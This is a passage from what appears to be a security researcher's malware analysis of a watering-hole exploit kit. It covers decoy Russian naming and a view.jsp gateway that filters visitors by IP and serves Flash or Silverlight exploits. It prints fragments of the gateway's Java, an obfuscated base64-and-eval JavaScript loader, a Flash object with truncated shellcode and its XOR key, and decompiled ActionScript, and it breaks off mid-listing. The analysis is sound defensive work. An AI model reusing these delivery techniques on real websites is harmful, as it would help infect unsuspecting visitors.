<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">omitted sign at the end, verb tense error</td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>"ustanovit'"</em> or <em>"ustanoviti"</em></td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>"poluchit"</em></td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">omitted sign at the end</td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>"poluchit'"</em> or <em>"poluchiti"</em></td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>"pereslat"</em></td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">omitted sign at the end</td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>"pereslat'"</em> or <em>"pereslati"</em></td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>"derzhat"</em></td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">omitted sign at the end</td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>"derzhat'"</em> or <em>"derzhati"</em></td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>"vykhodit"</em></td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">omitted sign at the end, verb tense error</td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle"><em>"vyiti"</em></td>
</tr>
</tbody></table>
</div>
<br />
Another example is <em>"kliyent2podklyuchit"</em>. This is most likely a result of an online translation of <em>"client2connect"</em> (which means <em>'client-to-connect'</em>). In this case, the two words <em>"client"</em> and <em>"connect"</em> were translated separately, then transliterated from the Russian pronunciation form into the Latin alphabet and finally joined to produce <em>"kliyent2podklyuchit"</em>.<br />
<br />
<br />
Such a result may look impressive to the bot's author, but would be difficult to understand for native Russian speakers.<br />
<br />
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5m4b1zAFAs0v7F5S4K-vCXbP6s-XN4TsFUUDQS6vxCsHPoUyuEIZrLeC9jhGJKwhtXKPk4qPX5yNJifOsd9kTfMAK9F_pqfGdmajKF8Aff-0y3Fshp2sjWwrnF8nCI0D39-KWBz2lOpI/s1600/client.PNG" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="257" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg5m4b1zAFAs0v7F5S4K-vCXbP6s-XN4TsFUUDQS6vxCsHPoUyuEIZrLeC9jhGJKwhtXKPk4qPX5yNJifOsd9kTfMAK9F_pqfGdmajKF8Aff-0y3Fshp2sjWwrnF8nCI0D39-KWBz2lOpI/s640/client.PNG" width="640" /></a></div>
<br />
<br />
Here we provide an example of translating the word <em>"client"</em> in Russian - the word <em>"kliyent"</em> here only demonstrates phonetic pronunciation, not how it's actually written in a transliterated form. When formed using the Latin alphabet, it would actually be written <em>"client"</em> or <em>"klient"</em>.<br />
<br />
Due to such inconsistencies, we conclude that the Russian language is likely used as a decoy tactic, in order to spoof the malware&#8217;s country of origin.<br />
<br />
<h5 style="font-size: 20px; margin-bottom: 0px;">
Sample #6 &#8211; cambio.swf</h5>
<br />
During the investigation of the watering-hole incident, the owner of a compromised website shared with us a malicious implant that was added into the site, presumably by using an exploit against <em>JBoss 5.0.0</em>.<br />
<br />
The script is called <code>view_jsp.java</code> and is accessed from the watering-hole website as <code>view.jsp</code>.<br />
<br />
This script is responsible for serving <code>cambio.swf</code>.<br />
<br />
The infection starts from a primary web site being compromised so that its visitors are redirected into a secondary website, calling its <code>view.jsp</code> script from an added IFrame. The initial request contains parameter <code>pagenum</code> set to <code>1</code>, such as:<br />
<br />
<div style="background: #f2f2f2; border: solid #a6a6a6 1.0pt; padding: 2pt; text-align: left;">
<div style="background: #f2f2f2; margin-left: 5px;">
<code>"GET /[PATH]/view.jsp?pagenum=1 HTTP/1.1"</code></div>
</div>
<br />
This begins the profiling and filtering to identify potential victims. For example, the script then checks to see if the client's IP is black-listed. If so, such initial request is rejected.<br />
<br />
Next, the script checks if the client&#8217;s IP is white-listed (i.e. targeted). If not white-listed, it is also rejected. Hence, unless the visitor&#8217;s IP is on the attackers&#8217; list, the script will not attempt to infect their machine. This helps the infected websites stay undetected for relatively long period of time, as they only serve exploits to the selected targets.<br />
<br />
In the next stage of the script, it builds and serves back to the client an HTML page with an embedded JavaScript that detects the type of client&#8217;s browser (Internet Explorer, Google Chrome, Firefox, Safari, or Opera), OS version, and the loaded plugins, such as Adobe Flash and Microsoft Silverlight.<br />
<br />
The script executed on a client side then builds a form, and submits it back to the gateway script, as shown below:<br />
<br />
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjK0kzFfB9YK2dOrmr1foR3fQnzKtRREcbekPR7WfX2XDtSDD8uxvywbPutCv3QJwz36MtbEU7MZiaMecmkk060UogfPfmDM09xc4nRPLfIwEkyRtVpz_fHsewW6w64e5Y41IK4sANLMao/s1600/1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjK0kzFfB9YK2dOrmr1foR3fQnzKtRREcbekPR7WfX2XDtSDD8uxvywbPutCv3QJwz36MtbEU7MZiaMecmkk060UogfPfmDM09xc4nRPLfIwEkyRtVpz_fHsewW6w64e5Y41IK4sANLMao/s1600/1.png" /></a></div>
<br />
The submitted form specifies the <code>pagenum</code> parameter to be set to <code>2</code>, to advance the script to the next step:<br />
<br />
<div class="separator" style="clear: both; text-align: center;">
<a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEipB6IXExzTLlvt6QirzM17oCjSAr5zVW7EFj3dgFUsO3mIeRgD68QW3c1x83aJZzxNUd7Bny3FG3WCJxkbjm9w5a3d7sX157co29ybjay8UEpR_l7jHmCB4y0olRbojhD3CnluU540YYE/s1600/2.PNG" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEipB6IXExzTLlvt6QirzM17oCjSAr5zVW7EFj3dgFUsO3mIeRgD68QW3c1x83aJZzxNUd7Bny3FG3WCJxkbjm9w5a3d7sX157co29ybjay8UEpR_l7jHmCB4y0olRbojhD3CnluU540YYE/s1600/2.PNG" /></a></div>
<br />
Once the script accepts the incoming request and finds the form's <code>pagenum</code> value is <code>2</code>, it reads other fields from the submitted form and decides which exploit to serve back to the client.<br />
<br />
At the time of writing, the exploit kit known to serve back two exploits, for Adobe Flash and Microsoft Silverlight, though these could be expanded upon as needed.<br />
<br />
The exploits can be individually enabled or disabled by the attackers with the standalone file <code>config.dat</code>. For example, to enable both exploits (flag=<code>1</code>), the contents of this file can be set to:<br />
<br />
<div style="background: #f2f2f2; border: solid #a6a6a6 1.0pt; padding: 2pt; text-align: left;">
<div style="background: #f2f2f2; margin-left: 5px;">
<code>2016-0034:1<br />
0000-0001:1</code></div>
</div>
<br />
where <code>2016-0034</code> identifies the Silverlight exploit, and <code>0000-0001</code> is the Flash exploit.<br />
<br />
If the script detects that the submitted form contains a non-empty version of Silverlight browser plugin, it will generate and serve back a Silverlight exploit. If the submitted form has a non-empty version of Adobe Flash browser plugin, the script will generate and serve back the Flash exploit. If the client has both plugins loaded within the browser, then the script will serve the Flash exploit only.<br />
<br />
NOTE: the script only serves the Flash exploit if the browser is Internet Explorer.<br />
<br />
The exploits are generated by the functions:<br />
<br />
<ul>
<li style="list-style-type: none; text-align: left;">&nbsp;&nbsp;&#8226;&nbsp;&nbsp;<code>genExp_20160034()</code> &#8211; to generate Silverlight exploit</li>
<li style="list-style-type: none; text-align: left;">&nbsp;&nbsp;&#8226;&nbsp;&nbsp;<code>genExp_00000001()</code> &#8211; to generate Flash exploit</li>
</ul>
<br />
The latter is explained in further detail below. First, the script builds URL string named as <code>download_url</code>:<br />
<br />
<div style="overflow-x: auto;">
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; width: 100%;"><tbody>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>01</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>String PARAMNAME_UID = <span style="color: blue;">"uid"</span>;</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>02</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>String PARAMNAME_PAGENUM = <span style="color: blue;">"pagenum"</span>;</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>03</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>String PARAMNAME_EXPLOITID = <span style="color: blue;">"eid"</span>;</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>04</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>String PARAMNAME_STATUS = <span style="color: blue;">"s"</span>;</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>05</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>String PARAMNAME_DATA = <span style="color: blue;">"data"</span>;</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>06</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>&nbsp;</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>07</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>download_url = request.getRequestURL() + </code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>08</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 135px;"><span style="color: blue;">"?"</span> + PARAMNAME_UID + <span style="color: blue;">"="</span> + uid +</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>09</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 135px;"><span style="color: blue;">"&amp;"</span> + PARAMNAME_PAGENUM + <span style="color: blue;">"=3"</span> +</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>10</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 135px;"><span style="color: blue;">"&amp;"</span> + PARAMNAME_EXPLOITID +</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>11</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 135px;"><span style="color: blue;">"="</span> + exploit.get(<span style="color: blue;">"eid"</span>);</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>12</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>...</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>13</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>download_url = download_url + </code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>14</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 135px;"><span style="color: blue;">"&amp;"</span> + PARAMNAME_STATUS + <span style="color: blue;">"=2"</span> +</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>15</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 135px;"><span style="color: blue;">"&amp;"</span> + PARAMNAME_DATA + <span style="color: blue;">"="</span>;</span></code>
   </td>
</tr>
</tbody></table>
</div>
<br />
<br />
For example, the URL string may look like:<br />
<br />
<div style="background: #f2f2f2; border: solid #a6a6a6 1.0pt; padding: 2pt; text-align: left;">
<div style="background: #f2f2f2; margin-left: 5px;">
<code>http://[WEB_SITE]/view.jsp?uid=30304811&amp;pagenum=3&amp;eid=00000002&amp;s=2&amp;data=</code></div>
</div>
<br />
Note that the <code>pagenum</code> parameter of the URL has now advanced to <code>3</code> (third step of the <code>view.jsp</code> execution).<br />
<br />
This URL string will be embedded by the <code>genExp_00000001()</code> function into the body of the shellcode.<br />
<br />
The output of the <code>genExp_00000001()</code> function is JavaScript that has the following format &#8211; this script will be executed inside the client's browser:<br />
<br />
<div style="overflow-x: auto;">
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; width: 100%;"><tbody>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>01</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>var laskfji = <span style="color: blue;">'PGh0bWw+..'</span>; <span style="color: #008200;">// long string here</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>02</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>asdlfkj = function(s) {</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>03</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 27px;"><span style="color: #008200;">// base64-decode string s</span></span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>04</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>};</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>05</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>var polkio = asdlfkj(laskfji);</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>06</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code>var poikea = <span style="color: blue;">'document.write(polkio);'</span>;</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>07</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>eval(poikea);</code>
   </td>
</tr>
</tbody></table>
</div>
<br />
Once the string <code>s</code> is base64-decoded by client-based JavaScript, it will look like a Flash object embedded into HTML:<br />
<br />
<div style="overflow-x: auto;">
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; width: 100%;"><tbody>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>01</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>&lt;html&gt;</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>02</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 18px;">&lt;body&gt;</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>03</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 36px;">&lt;object classid=<span style="color: blue;">"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000"</span></span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>04</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 99px;">codebase=<span style="color: blue;">"http://download.macromedia.com/.../swflash.cab"</span></span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>05</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 99px;">width=<span style="color: blue;">"1"</span></span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>06</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 99px;">height=<span style="color: blue;">"1"</span> &gt;</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>07</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 54px;">&lt;param name=<span style="color: blue;">"movie"</span> value=<span style="color: blue;">"include/cambio.swf"</span> /&gt;</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>08</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 54px;">&lt;param name=<span style="color: blue;">"allowScriptAccess"</span> value=<span style="color: blue;">"always"</span> /&gt;</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>09</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 54px;">&lt;param name=<span style="color: blue;">"FlashVars"</span></span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>10</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 108px;">value=<span style="color: blue;">"shell=558BEC83...00&amp;Health=polki89jdm#ks@"</span> /&gt;</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>11</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 54px;">&lt;param name=<span style="color: blue;">"Play"</span> value=<span style="color: blue;">"true"</span> /&gt;</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>12</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 54px;">&lt;embed type=<span style="color: blue;">"application/x-shockwave-flash"</span></span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>13</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 108px;">width=<span style="color: blue;">"1"</span></span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>14</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 108px;">height=<span style="color: blue;">"1"</span></span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>15</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 108px;">src=<span style="color: blue;">"include/cambio.swf"</span></span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>16</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 108px;">allowScriptAccess=<span style="color: blue;">"always"</span></span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>17</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 108px;">FlashVars=<span style="color: blue;">"shell=558BEC83...00&amp;Health=polki89jdm#ks@"</span></span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>18</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 108px;">Play=<span style="color: blue;">"true"</span>/&gt;</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>19</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 36px;">&lt;/object&gt;</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>20</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="margin-left: 18px;">&lt;/body&gt;</span></code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>21</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>&lt;/html&gt;</code>
   </td>
</tr>
</tbody></table>
</div>
<br />
<br />
As seen in the Flash object parameters, the SWF object is served from the website&#8217;s path:<br />
<br />
<div style="background: #f2f2f2; border: solid #a6a6a6 1.0pt; padding: 2pt; text-align: left;">
<div style="background: #f2f2f2; margin-left: 5px;">
<code>include/cambio.swf</code></div>
</div>
<br />
However, the SWF object is also accompanied with 2 extra parameters:<br />
<br />
<div style="overflow-x: auto;">
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse; border: none; width: 100%px;"><tbody>
<tr>
<td style="background: #3d4146; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">SWF Parameter</td>
<td style="background: #3d4146; border-left: none; border: solid #3d4146 1.0pt; color: white; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">Value</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">"shell"</td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">558BEC83EC388D45C8C745F...</td>
</tr>
<tr>
<td style="border-top: none; border: solid #3d4146 1.0pt; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">"Health"</td>
<td style="border-bottom: solid #3d4146 1.0pt; border-left: none; border-right: solid #3d4146 1.0pt; border-top: none; padding: 0cm 5.4pt 0cm 5.4pt; vertical-align: middle;" valign="middle">polki89jdm#ks@</td>
</tr>
</tbody></table>
</div>
<br />
By looking into the decompiled <code>cambio.swf</code> file, its ActionScript reveals that the SWF file indeed expects 2 parameters: <code>Health</code> and <code>shell</code>.<br />
<br />
The value of <code>Health</code> is used as an XOR key to decode the binary blob <code>orinBin</code>, which is included in the SWF file. This blob is then loaded with <code>loadBytes()</code>, as shown below:<br />
<br />
<div style="overflow-x: auto;">
<table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; width: 100%;"><tbody>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>01</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>objLoader = <span style="color: #006699;">new</span> Loader();</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>02</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="color: #006699;">this</span>.params = loaderInfo.parameters;</code>
   </td>
</tr>
<tr>
   <td style="background-color: white; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>03</code>
   </td>
   <td style="background-color: white; color: black; padding-left: 0.5em; white-space: nowrap;"><code>...</code>
   </td>
</tr>
<tr>
   <td style="background-color: #f8f8f8; border-right: 3px solid #6ce26c; color: #afafaf; padding: 0 0.5em 0 1em; text-align: right; white-space: nowrap;"><code>04</code>
   </td>
   <td style="background-color: #f8f8f8; color: black; padding-left: 0.5em; white-space: nowrap;"><code><span style="color: #006699;">var</span> key:<span style="color: grey;">String</span> = params[<span style="color: blue;">"Health"</span>] as <span style="color: grey;">String</span>;</code>
   </td>
</tr>
<tr>
